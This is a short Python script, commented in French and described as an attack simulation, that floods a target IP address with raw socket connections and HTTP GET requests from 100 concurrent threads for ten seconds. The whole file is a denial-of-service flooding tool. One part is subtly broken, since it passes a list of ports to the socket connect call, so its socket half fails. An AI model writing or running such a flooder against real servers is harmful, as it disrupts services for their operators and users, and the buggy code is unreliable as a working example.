import socket
import threading
import time
import requests

# Paramètres de l'attaque
target_ip = "192.168.0.100"  # Adresse IP de test
target_port = [80, 443]             # Port cible (HTTP par exemple)
target_url = f"http://{target_ip}"  # URL cible pour les requêtes HTTP
number_of_threads = 100      # Nombre de threads simulant les requêtes
attack_duration = 10         # Durée de l'attaque (en secondes)

# Fonction pour envoyer des requêtes malveillantes via socket
def send_socket_requests():
    try:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, target_port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    except Exception as e:
        print(f"Erreur (socket) : {e}")

# Fonction pour envoyer des requêtes HTTP via requests
def send_http_requests():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Requête HTTP envoyée, statut : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur (HTTP) : {e}")

# Démarrage des threads pour les sockets
socket_threads = []
for _ in range(number_of_threads // 2):  # Moitié des threads pour les sockets
    thread = threading.Thread(target=send_socket_requests)
    thread.daemon = True
    socket_threads.append(thread)
    thread.start()

# Démarrage des threads pour les requêtes HTTP
http_threads = []
for _ in range(number_of_threads // 2):  # Moitié des threads pour les requêtes HTTP
    thread = threading.Thread(target=send_http_requests)
    thread.daemon = True
    http_threads.append(thread)
    thread.start()

# Gestion du temps d'attaque
start_time = time.time()
while time.time() - start_time < attack_duration:
    time.sleep(1)

print("Simulation d'attaque terminée.")